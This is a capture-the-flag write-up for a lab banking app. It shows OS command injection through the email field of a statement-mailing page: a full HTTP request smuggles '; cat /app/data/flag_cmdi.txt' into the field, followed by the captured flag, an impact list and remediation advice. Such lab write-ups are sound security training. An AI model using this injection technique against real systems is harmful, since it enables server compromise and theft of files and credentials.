# Writeup - Statement Mailer

---

## Challenge Name / Title

**Statement Mailer**

---

## Vulnerability Identified

**OS Command Injection**

The `/tools/statement` page allows a logged-in user to send a bank statement to an email address. During testing, I suspected the backend was passing the email value directly to a system shell command. By injecting a semicolon `;` followed by an arbitrary OS command into the email field, the application executed the injected command and returned its output in the page response confirming OS Command Injection.

---

## Exploitation Steps / Description

**Step 1:** Log in as a customer:
```
Username: john
Password: password123
```

**Step 2:** Navigate to:
```
http://localhost:3000/tools/statement
```

**Step 3:** Open Burp Suite → Repeater and send the following request:

```http
POST /tools/statement HTTP/1.1
Host: localhost:3000
Cookie: session=<your_session_cookie>
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

account_id=ACC-1042&email=a%40b.com%3B+cat+%2Fapp%2Fdata%2Fflag_cmdi.txt
```

The `email` field URL-decodes to: `a@b.com; cat /app/data/flag_cmdi.txt`

**Step 4:** The `;` terminates the `sendmail` command and the `cat` command executes. The server returns `200 OK` and the flag is rendered in the command output section of the page.

---


## Flag Obtained

```
FLAG{cmdi_c6e2b47c}
```

---

## Impact

In a real banking application, OS Command Injection allows an attacker to:
- Execute arbitrary commands on the server with the application's OS privileges
- Read sensitive files such as private keys, config files, and environment variables containing database credentials
- Establish a persistent reverse shell for ongoing unauthorized access
- Pivot laterally into the internal network and compromise other systems

This is a **Critical** severity vulnerability that can result in complete server compromise.

---

## Mitigation / Remediation

1. **Avoid Shell Commands:** Use a proper email library (e.g. Python's `smtplib`) instead of shelling out. Never use `shell=True` with user-controlled input.
2. **Input Validation:** Validate the email field strictly against a standard email format regex. Reject any input containing shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`).
3. **Least Privilege:** Run the application process with a restricted OS user that has minimal file system permissions.
4. **Use Argument Lists:** If OS commands are unavoidable, pass arguments as a list (e.g. `subprocess.run(['sendmail', email])`) rather than as a shell string.
